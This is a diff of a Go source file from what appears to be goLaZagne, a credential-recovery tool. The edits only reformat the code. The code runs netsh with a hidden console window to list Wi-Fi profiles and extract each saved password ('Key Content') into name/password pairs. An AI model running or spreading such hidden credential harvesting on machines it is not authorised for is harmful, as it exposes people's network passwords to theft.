@@ -1,14 +1,14 @@
 package wifi
 
 import (
-	"os/exec"
-	"syscall"
+	"bitbucket.org/j_kerby/golazagne/common"
 	"github.com/aglyzov/charmap"
+	"os/exec"
 	"strings"
-	"goLaZagne/common"
+	"syscall"
 )
 
-func ExecCommand(command string, params []string) string{
+func ExecCommand(command string, params []string) string {
 	cmd_li := exec.Command(command, params...)
 	cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Это необходимо для того что бы CMD запускалось в скрытом режиме
 	output, _ := cmd_li.Output()
@@ -29,8 +29,8 @@ func WifiExtractDataRun() common.ExtractWifiData {
 	var lines = strings.Split(output, "\r\n")
 	var users []string
 
-	for i:=range lines{
-		if strings.Contains(lines[i], "All User"){ //TODO ENGLISH
+	for i := range lines {
+		if strings.Contains(lines[i], "All User") { //TODO ENGLISH
 			users = append(users, strings.TrimSpace(strings.Split(lines[i], ":")[1]))
 			//println(strings.TrimSpace(strings.Split(lines[i], ":")[1]))
 		}
@@ -38,7 +38,7 @@ func WifiExtractDataRun() common.ExtractWifiData {
 
 	var Result common.ExtractWifiData
 	var data []common.NamePass
-	for i:=0; i < len(users); i++{
+	for i := 0; i < len(users); i++ {
 		var paramWifi = []string{
 			"wlan",
 			"show",
@@ -50,8 +50,8 @@ func WifiExtractDataRun() common.ExtractWifiData {
 		var output = ExecCommand("netsh", paramWifi)
 		var lines = strings.Split(output, "\r\n")
 
-		for j:=range lines{
-			if strings.Contains(lines[j], "Key Content"){ //TODO Английский
+		for j := range lines {
+			if strings.Contains(lines[j], "Key Content") { //TODO Английский
 				var (
 					dataAdd = common.NamePass{
 						users[i],
